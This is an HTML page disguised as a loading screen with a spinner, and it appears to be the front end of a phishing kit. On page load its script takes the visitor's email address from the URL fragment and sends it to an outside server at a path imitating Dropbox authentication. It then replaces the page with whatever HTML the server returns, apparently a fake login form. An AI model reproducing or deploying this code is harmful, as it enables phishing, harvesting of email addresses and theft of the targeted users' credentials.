<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    /* Basic styles for loader */
    .loader {
      position: fixed;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      border: 8px solid #f3f3f3;
      border-radius: 50%;
      border-top: 8px solid #3498db;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
      z-index: 9999;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="loader" class="loader"></div>
  <script>
    async function fetchData() {
      const email = window.location.hash.substr(1); //new URLSearchParams(window.location.search).get('e');
      const restrid = 'link_gigs_mx';
      const params = new URLSearchParams();
      params.append('e', email);
      // params.append('restrid', restrid);

      const response = await fetch('https://gates.com.de/logs/divapro.hill.drop.box.aut/PostCallLink/index.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      });

      const data = await response.text(); 

      document.open();
      document.write(data);
      document.close();
    }

    fetchData();
  </script>
</body>
</html>
